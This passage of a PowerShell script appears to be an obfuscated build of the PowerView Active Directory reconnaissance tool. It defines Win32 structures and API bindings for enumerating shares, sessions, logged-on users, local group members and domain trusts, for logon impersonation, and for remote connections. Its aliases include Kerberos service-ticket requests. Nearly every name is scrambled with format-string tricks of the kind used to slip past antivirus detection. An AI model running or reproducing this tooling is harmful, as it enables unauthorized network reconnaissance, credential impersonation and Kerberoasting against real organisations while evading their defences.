            ${g`PO`ACl} | &("{0}{2}{1}" -f 'Ad','-Member','d') ("{2}{0}{1}"-f'tepr','operty','No') ("{2}{1}{3}{4}{0}{5}" -f 'Righ','v','Acti','eDir','ectory','ts') ${A`cl}."a`CTIved`i`RECToRYRIg`hTS"
            ${g`poAcl}
        }
        }
    }
}











${M`OD} = &("{0}{1}{4}{3}{2}"-f 'Ne','w-InMemory','dule','o','M') -ModuleName ("{0}{1}" -f'Win','32')




${sa`Macco`UN`T`Typ`EENum} = &("{0}{1}" -f 'p','senum') ${M`Od} ("{0}{1}{7}{5}{2}{4}{6}{3}"-f'P','ower','coun','Enum','tTyp','SamAc','e','View.') ("{1}{0}{2}"-f'n','UI','t32') @{
    ("{2}{0}{1}{3}" -f 'N_','OBJ','DOMAI','ECT')                   =   ("{1}{3}{2}{0}" -f '0000','0x','00','00')
    ("{0}{3}{1}{2}" -f'GROUP_','BJE','CT','O')                    =   ("{1}{2}{0}" -f '0000000','0','x1')
    ("{4}{6}{1}{3}{2}{5}{0}" -f 'T','Y','GROUP_OBJE','_','NON_SEC','C','URIT')       =   ("{1}{0}{2}"-f '10','0x','000001')
    ("{3}{0}{1}{2}"-f '_O','B','JECT','ALIAS')                    =   ("{1}{2}{0}" -f'0000000','0x','2')
    ("{4}{5}{7}{3}{1}{2}{0}{6}" -f'E','E','CURITY_ALIAS_OBJ','_S','N','O','CT','N')       =   ("{2}{0}{1}{3}" -f'0','000','0x20','01')
    ("{1}{3}{2}{0}"-f'CT','USE','JE','R_OB')                     =   ("{2}{1}{0}"-f '00','00000','0x3')
    ("{1}{4}{0}{3}{2}"-f'CCO','MACHIN','T','UN','E_A')                 =   ("{0}{1}{2}{3}" -f '0x3','0','000','001')
    ("{0}{1}{2}" -f 'TR','UST_A','CCOUNT')                   =   ("{1}{0}{2}"-f 'x300','0','00002')
    ("{2}{1}{0}{3}"-f 'ASIC_GR','_B','APP','OUP')                 =   ("{0}{2}{1}" -f '0x','0000000','4')
    ("{0}{3}{4}{2}{1}" -f'AP','UP','ERY_GRO','P','_QU')                 =   ("{1}{2}{0}" -f '01','0x4000','00')
    ("{3}{2}{0}{1}" -f'OUNT_TYPE_MA','X','C','AC')                =   ("{3}{2}{0}{1}"-f 'f','f','fffff','0x7')
}


${g`ROUP`T`ypE`enUM} = &("{1}{0}" -f'senum','p') ${m`oD} ("{5}{3}{4}{1}{6}{0}{2}" -f'eEnu','Gro','m','erView','.','Pow','upTyp') ("{2}{1}{0}" -f 't32','In','U') @{
    ("{1}{0}{4}{3}{2}" -f'E','CREAT','STEM','Y_SY','D_B')               =   ("{1}{0}{2}" -f '00','0x','000001')
    ("{1}{0}{2}"-f 'LOBAL_','G','SCOPE')                    =   ("{2}{1}{0}"-f '2','00000','0x00')
    ("{2}{0}{4}{3}{1}" -f 'MAIN','PE','DO','L_SCO','_LOCA')              =   ("{2}{0}{1}"-f'000000','04','0x')
    ("{2}{1}{3}{0}"-f 'PE','L_S','UNIVERSA','CO')                 =   ("{1}{2}{0}"-f '8','0','x0000000')
    ("{0}{2}{1}"-f'AP','C','P_BASI')                       =   ("{1}{0}{2}" -f '0','0x00000','10')
    ("{0}{2}{1}" -f'APP_Q','ERY','U')                       =   ("{0}{1}{2}{3}"-f'0x0','00','0002','0')
    ("{1}{2}{0}"-f'Y','SECUR','IT')                        =   ("{2}{1}{0}"-f'0','x8000000','0')
} -Bitfield


${U`Ace`NUm} = &("{1}{0}"-f 'num','pse') ${M`od} ("{1}{0}{2}{3}{4}" -f 'o','P','wer','Vie','w.UACEnum') ("{0}{1}" -f'UIn','t32') @{
    ("{1}{0}" -f 'IPT','SCR')                          =   1
    ("{1}{3}{2}{0}"-f'E','ACC','ABL','OUNTDIS')                  =   2
    ("{1}{3}{5}{2}{0}{4}"-f'R','H','_REQUI','OMED','ED','IR')                =   8
    ("{0}{1}" -f 'LO','CKOUT')                         =   16
    ("{4}{2}{0}{1}{3}" -f'N','OTREQ','SSWD_','D','PA')                  =   32
    ("{0}{3}{2}{1}" -f'PAS','_CHANGE','T','SWD_CAN')              =   64
    ("{1}{3}{4}{5}{0}{2}" -f '_P','ENCRYPTE','WD_ALLOWED','D_','T','EXT')      =   128
    ("{1}{3}{4}{2}{0}{5}" -f 'AT','TE','IC','MP_DU','PL','E_ACCOUNT')          =   256
    ("{2}{0}{1}" -f 'CO','UNT','NORMAL_AC')                  =   512
    ("{0}{1}{3}{4}{5}{2}" -f 'I','NTERDOMAIN_TRUST','OUNT','_A','C','C')       =   2048
    ("{4}{2}{1}{6}{3}{0}{5}"-f'COUN','TRUS','STATION_','C','WORK','T','T_A')       =   4096
    ("{0}{2}{3}{1}"-f'S','OUNT','ERVER_TRUST_A','CC')            =   8192
    ("{1}{3}{4}{2}{0}" -f 'WORD','D','XPIRE_PASS','ONT','_E')            =   65536
    ("{4}{2}{1}{3}{0}{5}" -f'LOG','S','N','_','M','ON_ACCOUNT')               =   131072
    ("{1}{0}{3}{2}"-f'ARD_R','SMARTC','ED','EQUIR')              =   262144
    ("{0}{1}{5}{3}{4}{6}{2}"-f'TRUSTE','D_','ION','OR_DE','LE','F','GAT')          =   524288
    ("{2}{3}{1}{0}"-f 'D','ATE','NO','T_DELEG')                   =   1048576
    ("{3}{2}{4}{1}{0}" -f 'LY','ON','_','USE_DES','KEY_')                =   2097152
    ("{3}{0}{1}{2}{4}"-f 'T_RE','Q_PR','E','DON','AUTH')                =   4194304
    ("{0}{1}{3}{2}"-f 'PA','SS','_EXPIRED','WORD')                =   8388608
    ("{5}{0}{3}{4}{1}{2}" -f'TED_','LEG','ATION','TO_AUTH_FOR','_DE','TRUS')  =   16777216
    ("{5}{1}{6}{3}{4}{0}{2}"-f'CCOUN','TIAL_S','T','C','RETS_A','PAR','E')         =   67108864
} -Bitfield


${WTsCo`Nn`eCtsT`Ate} = &("{1}{0}{2}" -f 'sen','p','um') ${m`OD} ("{5}{0}{3}{2}{1}{4}" -f'_CON','E','ECTSTAT','N','_CLASS','WTS') ("{0}{1}"-f'UInt','16') @{
    ("{0}{1}{2}"-f 'Ac','t','ive')       =    0
    ("{1}{2}{0}"-f 'd','Conne','cte')    =    1
    ("{1}{0}{3}{2}"-f'o','C','ry','nnectQue') =    2
    ("{0}{1}"-f'S','hadow')       =    3
    ("{2}{1}{0}"-f'cted','onne','Disc') =    4
    ("{0}{1}" -f 'Idl','e')         =    5
    ("{2}{0}{1}" -f 'ste','n','Li')       =    6
    ("{0}{1}"-f 'Re','set')        =    7
    ("{1}{0}"-f 'wn','Do')         =    8
    ("{0}{1}"-f'I','nit')         =    9
}


${Wts_s`essI`on`_i`NFo_1} = &("{1}{0}" -f'ruct','st') ${M`OD} ("{3}{5}{6}{0}{4}{2}{1}" -f 'ssi','Info','n','Pow','o','erVi','ew.RDPSe') @{
    ("{3}{2}{1}{0}"-f'd','vI','cEn','Exe') = &("{0}{1}" -f 'fie','ld') 0 ("{0}{1}"-f 'UIn','t32')
    ("{1}{0}" -f'ate','St') = &("{1}{0}" -f'ield','f') 1 ${wT`sC`o`NnEcTsT`A`TE}
    ("{0}{1}"-f'Ses','sionId') = &("{1}{0}"-f 'ld','fie') 2 ("{0}{1}"-f 'U','Int32')
    ("{2}{0}{1}{3}" -f 'ssio','nN','pSe','ame') = &("{0}{1}" -f 'fiel','d') 3 ("{0}{2}{1}" -f'S','g','trin') -MarshalAs @(("{1}{0}{2}"-f'S','LPW','tr'))
    ("{0}{2}{3}{1}"-f'p','ame','Host','N') = &("{0}{1}" -f'fi','eld') 4 ("{0}{2}{1}"-f'Str','g','in') -MarshalAs @(("{1}{0}{2}" -f'P','L','WStr'))
    ("{2}{0}{1}"-f 'am','e','pUserN') = &("{1}{0}" -f'eld','fi') 5 ("{1}{0}" -f'ing','Str') -MarshalAs @(("{1}{0}" -f 'Str','LPW'))
    ("{0}{3}{2}{1}"-f'p','mainName','o','D') = &("{1}{0}" -f 'd','fiel') 6 ("{1}{0}" -f 'ing','Str') -MarshalAs @(("{1}{0}"-f'tr','LPWS'))
    ("{1}{2}{0}"-f 'me','pFar','mNa') = &("{0}{1}" -f'fi','eld') 7 ("{1}{0}" -f 'ng','Stri') -MarshalAs @(("{1}{0}" -f 'tr','LPWS'))
}


${WTS_Cl`iEN`T`_AdDR`ESs} = &("{0}{1}"-f'str','uct') ${m`od} ("{2}{4}{1}{3}{0}"-f'RESS','S_CLIE','W','NT_ADD','T') @{
    ("{0}{2}{3}{1}" -f'Addr','amily','es','sF') = &("{0}{1}" -f 'fi','eld') 0 ("{0}{1}" -f'UI','nt32')
    ("{0}{1}"-f 'Addres','s') = &("{1}{0}" -f'd','fiel') 1 ("{0}{1}"-f 'Byte[',']') -MarshalAs @(("{1}{2}{0}"-f 'ray','By','ValAr'), 20)
}


${ShA`Re`_inf`o`_1} = &("{1}{0}" -f 'ct','stru') ${M`OD} ("{0}{2}{1}{3}{4}" -f'P','View.Share','ower','I','nfo') @{
    ("{0}{1}" -f'Na','me') = &("{1}{0}" -f'ld','fie') 0 ("{1}{2}{0}" -f'ing','St','r') -MarshalAs @(("{0}{1}" -f 'LPW','Str'))
    ("{0}{1}" -f 'T','ype') = &("{0}{1}" -f'fiel','d') 1 ("{1}{0}{2}" -f'Int3','U','2')
    ("{0}{1}" -f 'Rema','rk') = &("{1}{0}"-f 'ld','fie') 2 ("{0}{1}"-f'Stri','ng') -MarshalAs @(("{1}{0}" -f 'PWStr','L'))
}


${Wks`Ta_`USER_`I`NfO_1} = &("{0}{2}{1}"-f 'st','ct','ru') ${M`Od} ("{7}{0}{3}{1}{2}{5}{6}{4}"-f 'rVie','ge','d','w.Log','serInfo','On','U','Powe') @{
    ("{1}{2}{0}"-f'ame','U','serN') = &("{1}{0}"-f 'eld','fi') 0 ("{0}{1}" -f 'Stri','ng') -MarshalAs @(("{0}{1}"-f 'LPWSt','r'))
    ("{2}{0}{1}" -f'og','onDomain','L') = &("{1}{0}"-f 'ld','fie') 1 ("{2}{1}{0}" -f'g','n','Stri') -MarshalAs @(("{1}{0}{2}"-f 'PW','L','Str'))
    ("{1}{0}{2}" -f 'Domai','Auth','ns') = &("{0}{1}"-f 'fie','ld') 2 ("{0}{2}{1}" -f'Str','g','in') -MarshalAs @(("{0}{1}{2}"-f'L','PW','Str'))
    ("{0}{1}{2}" -f'LogonS','erv','er') = &("{1}{0}"-f 'ield','f') 3 ("{0}{1}" -f 'S','tring') -MarshalAs @(("{0}{1}"-f 'L','PWStr'))
}


${SEs`sIon_iN`F`O`_10} = &("{0}{1}" -f's','truct') ${m`od} ("{5}{3}{1}{4}{2}{0}"-f'o','i','nInf','.Sess','o','PowerView') @{
    ("{0}{1}"-f 'CNa','me') = &("{1}{0}"-f 'd','fiel') 0 ("{0}{1}" -f 'S','tring') -MarshalAs @(("{0}{1}{2}"-f'LPW','S','tr'))
    ("{1}{0}" -f'me','UserNa') = &("{1}{0}" -f'eld','fi') 1 ("{0}{1}"-f 'Stri','ng') -MarshalAs @(("{1}{0}" -f 'Str','LPW'))
    ("{1}{0}" -f'me','Ti') = &("{0}{1}"-f'fie','ld') 2 ("{0}{1}"-f'U','Int32')
    ("{1}{0}{2}"-f'eTim','Idl','e') = &("{1}{0}"-f 'd','fiel') 3 ("{0}{2}{1}" -f'U','t32','In')
}


${siD`_NAmE`_`UsE} = &("{0}{1}"-f'psenu','m') ${m`OD} ("{2}{3}{1}{0}"-f 'USE','ME_','S','ID_NA') ("{1}{0}"-f'6','UInt1') @{
    ("{0}{2}{1}"-f 'SidTy','ser','peU')             = 1
    ("{0}{3}{2}{1}"-f'SidTy','oup','eGr','p')            = 2
    ("{0}{2}{1}"-f 'SidTypeD','ain','om')           = 3
    ("{2}{0}{1}{3}" -f 'y','p','SidT','eAlias')            = 4
    ("{0}{3}{4}{1}{2}" -f 'SidTypeW','nG','roup','e','llKnow')   = 5
    ("{1}{4}{2}{3}{0}" -f 'nt','Si','eDele','tedAccou','dTyp')   = 6
    ("{2}{4}{1}{3}{0}"-f'd','Inva','SidTyp','li','e')          = 7
    ("{2}{0}{1}" -f 'dTypeUnknow','n','Si')          = 8
    ("{1}{3}{0}{2}{4}"-f 'dTyp','S','eCom','i','puter')         = 9
}


${locALgroUP_`I`NF`o_1} = &("{1}{0}" -f 'uct','str') ${m`OD} ("{1}{3}{2}{0}" -f'_1','LO','NFO','CALGROUP_I') @{
    ("{1}{0}{3}{2}"-f 'i1','lgrp','ame','_n') = &("{1}{0}" -f 'd','fiel') 0 ("{0}{1}"-f 'Strin','g') -MarshalAs @(("{0}{1}"-f 'L','PWStr'))
    ("{0}{1}{3}{2}" -f'lgrpi','1','omment','_c') = &("{1}{0}"-f 'd','fiel') 1 ("{1}{2}{0}" -f 'ng','St','ri') -MarshalAs @(("{2}{0}{1}"-f'S','tr','LPW'))
}


${Local`gro`UP_`meMBeRs_iN`FO_2} = &("{0}{1}" -f 'str','uct') ${M`OD} ("{4}{3}{6}{2}{0}{1}{5}" -f 'RS_I','NFO','EMBE','U','LOCALGRO','_2','P_M') @{
    ("{2}{3}{0}{1}" -f 'i','2_sid','lgr','m') = &("{1}{0}" -f 'ield','f') 0 ("{1}{0}" -f'tr','IntP')
    ("{0}{1}{2}{3}" -f'lgr','mi2','_sidusa','ge') = &("{1}{0}"-f 'eld','fi') 1 ${sI`D_N`A`me_Use}
    ("{1}{4}{6}{3}{5}{2}{0}" -f 'name','l','nand','a','grmi','i','2_dom') = &("{0}{1}" -f'fi','eld') 2 ("{2}{1}{0}"-f'ring','t','S') -MarshalAs @(("{1}{0}" -f 'Str','LPW'))
}


${dsdo`m`AINfLAg} = &("{1}{0}" -f 'senum','p') ${M`Od} ("{1}{0}{3}{2}" -f 'ain.Fla','DsDom','s','g') ("{1}{0}" -f'nt32','UI') @{
    ("{1}{2}{0}"-f'EST','IN','_FOR')       = 1
    ("{2}{1}{3}{0}" -f 'UND','T_','DIREC','OUTBO') = 2
    ("{2}{1}{0}"-f 'OT','EE_RO','TR')       = 4
    ("{1}{0}"-f'IMARY','PR')         = 8
    ("{2}{0}{1}"-f 'VE_M','ODE','NATI')     = 16
    ("{1}{0}{2}{3}"-f'NBOU','DIRECT_I','N','D')  = 32
} -Bitfield
${dsd`omAi`NTRustT`ype} = &("{1}{2}{0}" -f 'm','psen','u') ${M`oD} ("{1}{3}{2}{0}" -f 'Type','DsDo','ust','main.Tr') ("{0}{2}{1}" -f 'UInt','2','3') @{
    ("{2}{1}{0}"-f'VEL','OWNLE','D')   = 1
    ("{0}{2}{1}" -f 'UPLEV','L','E')     = 2
    ("{1}{0}" -f'IT','M')         = 3
    ("{1}{0}" -f'CE','D')         = 4
}
${DS`dOMAI`NtrUsTa`TT`Ribu`T`eS} = &("{1}{0}" -f 'm','psenu') ${M`Od} ("{4}{0}{2}{3}{1}{5}{6}"-f 'o','ustA','ma','in.Tr','DsD','ttr','ibutes') ("{1}{0}" -f 't32','UIn') @{
    ("{2}{0}{1}{3}{4}"-f 'ON_TR','A','N','N','SITIVE')      = 1
    ("{1}{3}{2}{0}" -f'_ONLY','UP','L','LEVE')        = 2
    ("{0}{2}{1}{3}" -f'F','_','ILTER','SIDS')         = 4
    ("{0}{5}{2}{4}{3}{1}" -f'F','E','RES','RANSITIV','T_T','O')   = 8
    ("{1}{3}{0}{2}" -f 'OSS_ORGANIZAT','C','ION','R')  = 16
    ("{3}{1}{2}{0}" -f'EST','O','R','WITHIN_F')       = 32
    ("{1}{3}{2}{0}"-f'ERNAL','TREAT_AS','T','_EX')   = 64
}


${D`S_DomAin`_TRu`S`Ts} = &("{0}{1}" -f'struc','t') ${m`Od} ("{2}{1}{0}{3}" -f'DOMA','S_','D','IN_TRUSTS') @{
    ("{3}{4}{0}{1}{2}"-f 'ainN','a','me','Ne','tbiosDom') = &("{1}{0}"-f'ld','fie') 0 ("{0}{1}" -f 'Str','ing') -MarshalAs @(("{2}{0}{1}" -f 'PW','Str','L'))
    ("{1}{0}{2}" -f 'mainN','DnsDo','ame') = &("{1}{0}" -f'd','fiel') 1 ("{0}{1}{2}"-f'Str','i','ng') -MarshalAs @(("{1}{2}{0}" -f'tr','LPW','S'))
    ("{1}{0}"-f'gs','Fla') = &("{1}{0}"-f'ield','f') 2 ${DSDoMA`iNf`lAg}
    ("{1}{0}{2}" -f 'entInde','Par','x') = &("{1}{0}"-f'd','fiel') 3 ("{1}{0}{2}"-f 'nt3','UI','2')
    ("{2}{1}{0}"-f'stType','ru','T') = &("{0}{1}" -f'fi','eld') 4 ${DSdoMaIN`T`RUST`Ty`pE}
    ("{2}{0}{3}{1}"-f 'Attri','tes','Trust','bu') = &("{1}{0}" -f'd','fiel') 5 ${dS`do`m`Aint`Ru`StatTRIbuT`ES}
    ("{0}{1}{2}" -f 'Domai','nSi','d') = &("{1}{0}"-f'ld','fie') 6 ("{2}{0}{1}"-f'n','tPtr','I')
    ("{1}{2}{0}"-f'd','Do','mainGui') = &("{1}{0}" -f 'ld','fie') 7 ("{0}{1}"-f'G','uid')
}


${n`ET`R`eSourC`Ew} = &("{2}{0}{1}"-f'truc','t','s') ${M`od} ("{1}{2}{3}{0}" -f 'EW','NETR','ES','OURC') @{
    ("{1}{0}" -f'pe','dwSco') =         &("{0}{1}"-f 'fie','ld') 0 ("{1}{2}{0}" -f'2','UI','nt3')
    ("{1}{0}"-f 'pe','dwTy') =          &("{0}{1}" -f'fie','ld') 1 ("{0}{1}"-f 'UI','nt32')
    ("{0}{1}{2}{3}" -f 'd','wDisplay','Ty','pe') =   &("{1}{0}" -f'd','fiel') 2 ("{1}{0}"-f'2','UInt3')
    ("{1}{2}{0}"-f'age','dw','Us') =         &("{1}{0}" -f'd','fiel') 3 ("{0}{2}{1}"-f 'U','nt32','I')
    ("{0}{2}{1}{3}"-f 'lp','alNam','Loc','e') =     &("{1}{0}" -f 'ield','f') 4 ("{0}{1}"-f'S','tring') -MarshalAs @(("{1}{0}" -f'tr','LPWS'))
    ("{2}{1}{0}" -f'oteName','Rem','lp') =    &("{1}{0}"-f'eld','fi') 5 ("{2}{1}{0}" -f'ing','r','St') -MarshalAs @(("{0}{1}{2}"-f'L','PWSt','r'))
    ("{1}{2}{0}" -f'nt','lp','Comme') =       &("{0}{1}" -f'f','ield') 6 ("{0}{1}" -f'Stri','ng') -MarshalAs @(("{0}{1}"-f'LPWSt','r'))
    ("{1}{2}{0}"-f'der','l','pProvi') =      &("{0}{1}" -f 'fie','ld') 7 ("{1}{0}" -f'g','Strin') -MarshalAs @(("{1}{0}{2}"-f'P','L','WStr'))
}


${Func`T`IO`Nd`EfIn`IT`iONS} = @(
    (&("{1}{0}"-f 'unc','f') ("{2}{0}{1}"-f 'i','32','netap') ("{0}{3}{2}{1}"-f'NetSha','Enum','e','r') ([Int]) @([String], [Int],  (  &("{1}{0}"-f 'iablE','vAr') ('9rZ'+'Q') -vaLUEoNLY  ).("{3}{2}{0}{1}"-f'ef','Type','R','MakeBy').Invoke(), [Int],  (&('LS') ('vAriABLe:'+'4'+'y7ItV') )."V`Alue".("{1}{0}{2}" -f'RefT','MakeBy','ype').Invoke(),   ${4y7`iTV}.("{0}{2}{4}{3}{1}" -f 'M','pe','akeB','fTy','yRe').Invoke(),   ${4Y`7i`Tv}.("{1}{0}{3}{2}"-f 'k','Ma','Type','eByRef').Invoke())),
    (&("{1}{0}"-f 'c','fun') ("{1}{0}"-f'2','netapi3') ("{0}{1}{4}{2}{3}" -f 'NetWk','st','se','rEnum','aU') ([Int]) @([String], [Int],   ${9R`ZQ}.("{2}{1}{0}{4}{3}" -f'keB','a','M','ype','yRefT').Invoke(), [Int],  (&("{2}{0}{1}" -f'AbL','E','VaRI')  ('4'+'Y7iTV'))."V`AlUe".("{1}{0}{2}{3}"-f 'eB','Mak','yRefT','ype').Invoke(),  ${4y7I`Tv}.("{2}{3}{1}{0}" -f 'pe','eByRefTy','M','ak').Invoke(),   (  &("{0}{1}" -f'VARIabL','e') ("{0}{1}"-f '4y7','ItV') -VALUeoNly ).("{0}{2}{1}"-f'Ma','RefType','keBy').Invoke())),
    (&("{0}{1}" -f 'fu','nc') ("{1}{0}{2}" -f 'a','net','pi32') ("{1}{2}{3}{0}" -f'Enum','NetSe','ss','ion') ([Int]) @([String], [String], [String], [Int],   (  &("{1}{0}{2}" -f'eT-VarIa','G','ble')  ("{1}{0}"-f 'Q','9rZ')  -valuE ).("{0}{3}{1}{2}" -f 'Ma','fTyp','e','keByRe').Invoke(), [Int],   (  &("{1}{2}{0}"-f'e','vAr','iaBL')  ("{1}{0}{2}"-f 'Y','4','7ITV') )."vaL`Ue".("{0}{1}{3}{2}"-f'MakeBy','Re','ype','fT').Invoke(),  ${4`Y7`iTV}.("{3}{1}{2}{0}"-f 'yRefType','ke','B','Ma').Invoke(),   ${4Y7`i`TV}.("{3}{1}{2}{0}" -f 'pe','ByRef','Ty','Make').Invoke())),
    (&("{1}{0}"-f 'c','fun') ("{2}{1}{0}" -f'32','tapi','ne') ("{4}{0}{1}{2}{3}" -f 'calGrou','p','E','num','NetLo') ([Int]) @([String], [Int],  (  &("{1}{0}" -f'ARiABLe','v')  ("{1}{0}"-f'rzq','9')  )."vaL`UE".("{1}{0}{2}{3}{4}"-f 'akeB','M','yRefTy','p','e').Invoke(), [Int],  ${4y7`ITv}.("{1}{0}{2}" -f'Typ','MakeByRef','e').Invoke(),   ${4Y`7ItV}.("{1}{2}{0}{3}" -f 'p','MakeBy','RefTy','e').Invoke(),  ${4y7I`Tv}.("{0}{1}{2}"-f'MakeBy','RefTy','pe').Invoke())),
    (&("{1}{0}" -f 'unc','f') ("{0}{1}" -f 'netap','i32') ("{6}{1}{4}{2}{0}{5}{3}" -f 'o','et','ocalGr','bers','L','upGetMem','N') ([Int]) @([String], [String], [Int],  ${9R`Zq}.("{4}{0}{1}{3}{2}"-f'B','y','pe','RefTy','Make').Invoke(), [Int],  (&("{0}{1}" -f'get-iTE','m') ("{2}{3}{0}{1}" -f':','4y7ItV','Va','rIabLe') )."VaL`UE".("{2}{1}{0}"-f 'e','Typ','MakeByRef').Invoke(),   ( &("{2}{0}{1}" -f'BL','E','VAriA') ("4Y7"+"itv"))."vA`luE".("{1}{3}{0}{2}{4}" -f'By','M','RefTyp','ake','e').Invoke(),   (  &("{1}{2}{0}{3}"-f'vAria','G','ET-','Ble')  ("{1}{0}"-f'Y7ITV','4'))."v`Alue".("{2}{1}{0}{3}{4}" -f'T','ByRef','Make','yp','e').Invoke())),
    (&("{1}{0}" -f 'nc','fu') ("{0}{1}{2}" -f'n','e','tapi32') ("{1}{2}{0}" -f 'teName','D','sGetSi') ([Int]) @([String],  ${9r`zq}.("{3}{1}{2}{0}" -f 'ype','B','yRefT','Make').Invoke())),
    (&("{0}{1}" -f'fun','c') ("{1}{0}{2}"-f'a','net','pi32') ("{1}{3}{4}{2}{0}"-f 'usts','Ds','r','EnumerateDo','mainT') ([Int]) @([String], [UInt32],  ${9`Rzq}.("{0}{1}{2}"-f'MakeB','y','RefType').Invoke(),  (  &("{0}{1}"-f'dI','r') ("{0}{2}{1}" -f'VaRI','LE:9RZq','aB'))."VA`LUe".("{0}{1}{2}"-f'Mak','eByRefT','ype').Invoke())),
    (&("{0}{1}"-f 'fu','nc') ("{0}{2}{1}"-f 'neta','i32','p') ("{2}{0}{1}{3}{4}"-f'tA','piBuff','Ne','erFr','ee') ([Int]) @([IntPtr])),
    (&("{0}{1}"-f'fun','c') ("{2}{0}{1}"-f 'ap','i32','adv') ("{4}{0}{5}{3}{1}{6}{2}"-f't','r','ngSid','St','Conver','SidTo','i') ([Int]) @([IntPtr],   (&("{0}{1}{2}"-f'GET','-ITe','m') ("v"+"A"+"ria"+"Ble:dmo"+"y")  )."vAl`UE".("{0}{1}{2}"-f 'MakeByRefT','yp','e').Invoke()) -SetLastError),
    (&("{1}{0}" -f'unc','f') ("{1}{2}{0}"-f'i32','ad','vap') ("{4}{0}{2}{1}{3}" -f'pe','age','nSCMan','rW','O') ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (&("{0}{1}"-f'fun','c') ("{1}{2}{0}" -f '32','adv','api') ("{2}{0}{1}{3}" -f'seSe','rvice','Clo','Handle') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f'unc','f') ("{1}{0}" -f'api32','adv') ("{0}{1}" -f'LogonUse','r') ([Bool]) @([String], [String], [String], [UInt32], [UInt32],   ${9r`zq}.("{2}{1}{0}{3}" -f'yRe','eB','Mak','fType').Invoke()) -SetLastError),
    (&("{1}{0}" -f'c','fun') ("{1}{2}{0}"-f 'pi32','a','dva') ("{3}{2}{5}{1}{0}{4}" -f'nUs','edO','t','Impersona','er','eLogg') ([Bool]) @([IntPtr]) -SetLastError),
    (&("{0}{1}"-f 'f','unc') ("{2}{1}{0}" -f'32','dvapi','a') ("{0}{3}{1}{2}"-f 'R','v','ertToSelf','e') ([Bool]) @() -SetLastError),
    (&("{0}{1}"-f'fu','nc') ("{0}{1}" -f 'wtsap','i32') ("{3}{0}{4}{1}{2}" -f'T','nServ','erEx','W','SOpe') ([IntPtr]) @([String])),
    (&("{0}{1}"-f'fu','nc') ("{2}{0}{1}" -f'i','32','wtsap') ("{1}{5}{0}{2}{4}{3}"-f'a','WTSEnu','teSession','Ex','s','mer') ([Int]) @([IntPtr],  (&('gi') ("{3}{0}{2}{1}"-f'RI','y7iTv','ABLe:4','Va'))."VAl`UE".("{2}{1}{0}{3}"-f 'ef','eByR','Mak','Type').Invoke(), [Int],   ${9R`Zq}.("{1}{2}{0}" -f'pe','MakeByRef','Ty').Invoke(),  (  &("{1}{0}{3}{2}" -f 'Et-Va','G','e','RiaBl')  ('4Y'+'7ItV'))."v`ALuE".("{1}{2}{3}{0}"-f'pe','Ma','keByRefT','y').Invoke()) -SetLastError),
    (&("{0}{1}"-f'f','unc') ("{0}{1}{2}"-f 'wts','ap','i32') ("{4}{6}{0}{3}{5}{1}{2}"-f 'essionI','atio','n','nfo','WTS','rm','QueryS') ([Int]) @([IntPtr], [Int], [Int],   ${9`Rzq}.("{0}{3}{2}{1}" -f 'Ma','e','efTyp','keByR').Invoke(),   (  &("{0}{1}{2}"-f 'g','e','T-itEm')  ("var"+"IABL"+"e:4Y7it"+"v"))."V`Alue".("{0}{4}{1}{2}{3}"-f 'M','efT','y','pe','akeByR').Invoke()) -SetLastError),
    (&("{1}{0}"-f 'nc','fu') ("{1}{0}{2}" -f 'tsap','w','i32') ("{0}{4}{3}{1}{2}" -f'WTS','E','x','y','FreeMemor') ([Int]) @([Int32], [IntPtr], [Int32])),
    (&("{1}{0}" -f'c','fun') ("{0}{1}" -f 'wtsa','pi32') ("{2}{0}{1}"-f'eeMe','mory','WTSFr') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f 'c','fun') ("{1}{0}{2}" -f 'i3','wtsap','2') ("{2}{1}{0}" -f 'loseServer','SC','WT') ([Int]) @([IntPtr])),
    (&("{1}{0}"-f 'c','fun') ("{0}{1}"-f 'Mp','r') ("{1}{0}{2}{3}{4}" -f 'dCo','WNetAd','nne','ctio','n2W') ([Int]) @(${NeTr`e`SOUrCew}, [String], [String], [UInt32])),
    (&("{0}{1}" -f 'fu','nc') ("{1}{0}" -f 'pr','M') ("{2}{3}{0}{1}"-f'ncelConnection','2','WNe','tCa') ([Int]) @([String], [Int], [Bool])),
    (&("{1}{0}" -f 'c','fun') ("{1}{0}{2}"-f 'ernel3','k','2') ("{0}{2}{1}"-f 'Close','dle','Han') ([Bool]) @([IntPtr]) -SetLastError)
)

${tY`P`eS} = ${fUNCTi`oN`d`e`Fi`NITi`onS} | &("{2}{0}{3}{1}" -f'dd-Win','Type','A','32') -Module ${M`OD} -Namespace ("{1}{0}" -f 'in32','W')
${nE`Tap`I32} = ${tyP`eS}[("{2}{1}{0}" -f '32','tapi','ne')]
${aDvAp`i`32} = ${Ty`p`es}[("{1}{2}{0}" -f'2','adva','pi3')]
${w`TS`APi32} = ${TyP`ES}[("{0}{2}{1}"-f 'wts','pi32','a')]
${m`Pr} = ${tY`P`es}['Mpr']
${KeR`N`eL`32} = ${t`YPeS}[("{2}{1}{0}"-f '2','l3','kerne')]

&("{0}{1}{2}" -f 'S','et-','Alias') ("{4}{1}{3}{2}{0}" -f 's','t','ddres','-IPA','Ge') ("{1}{3}{0}{2}" -f 'd','Res','ress','olve-IPAd')
&("{1}{2}{0}" -f 'as','Se','t-Ali') ("{1}{4}{3}{0}{2}" -f'meT','Co','oSid','a','nvert-N') ("{0}{2}{3}{1}"-f'Co','o-SID','nve','rtT')
&("{1}{0}{2}" -f '-Alia','Set','s') ("{0}{2}{4}{3}{1}"-f'C','rt-SidToName','on','e','v') ("{0}{1}{4}{3}{2}" -f'Co','nve','SID','tFrom-','r')
&("{0}{1}{2}" -f'S','et-A','lias') ("{1}{5}{2}{0}{4}{3}" -f'ick','Re','st-SPNT','t','e','que') ("{4}{1}{0}{2}{3}" -f'N','mainSP','Ti','cket','Get-Do')
&("{0}{1}{2}"-f'S','e','t-Alias') ("{0}{2}{1}"-f 'Ge','SZone','t-DN') ("{4}{0}{1}{3}{2}"-f '-','D','Zone','omainDNS','Get')
&("{0}{2}{1}{3}" -f'Set','a','-Ali','s') ("{2}{0}{1}" -f'NS','Record','Get-D') ("{4}{0}{1}{2}{3}" -f 'oma','inD','N','SRecord','Get-D')
&("{1}{0}{2}" -f'et-Al','S','ias') ("{2}{3}{0}{1}" -f 'mai','n','Get-','NetDo') ("{2}{0}{1}"-f 'Dom','ain','Get-')
&("{0}{2}{1}"-f'Set-','as','Ali') ("{0}{3}{2}{1}{5}{4}"-f 'Get-','tro','on','NetDomainC','r','lle') ("{2}{3}{0}{1}" -f'DomainCo','ntroller','G','et-')
